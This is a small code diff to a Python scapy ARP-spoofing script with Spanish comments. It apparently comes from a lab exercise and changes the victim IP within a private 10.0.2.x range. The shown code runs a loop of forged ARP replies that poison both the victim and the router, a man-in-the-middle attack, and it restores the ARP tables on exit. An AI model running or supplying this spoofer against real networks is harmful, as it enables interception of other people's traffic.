@@ -49,8 +49,8 @@ def restore(target_ip="10.0.2.1", target_mac="", des_ip="10.0.2.1"):
 
     des_mac = scan(des_ip)[0]["mac"]
 
-    catch = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                        psrc=des_ip, hwsrc=des_mac)
+    catch = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=des_ip,
+                      hwsrc=des_mac)
     scapy.send(catch, count=4, verbose=False)
 
 
@@ -58,9 +58,9 @@ paquetes_mandados = 0
 try:
     while True:
         """Engañamos a la víctima como que somos nosotros el router"""
-        spoof(target_ip="10.0.2.5")
+        spoof(target_ip="10.0.2.6")
         """Engañamos al router como que somos nosotros la víctima"""
-        spoof(des_ip="10.0.2.5")
+        spoof(des_ip="10.0.2.6")
         paquetes_mandados = paquetes_mandados + 2
         # python 2 La coma, es para almacenar la salida en el buffer
         # print("\rPaquetes mandados " + str(paquetes_mandados)),
@@ -70,6 +70,6 @@ try:
         print("\rPaquetes mandados " + str(paquetes_mandados), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    restore(target_ip="10.0.2.5")
+    restore(target_ip="10.0.2.6")
     restore(des_ip="10.0.2.1")
     print("Bye bye")
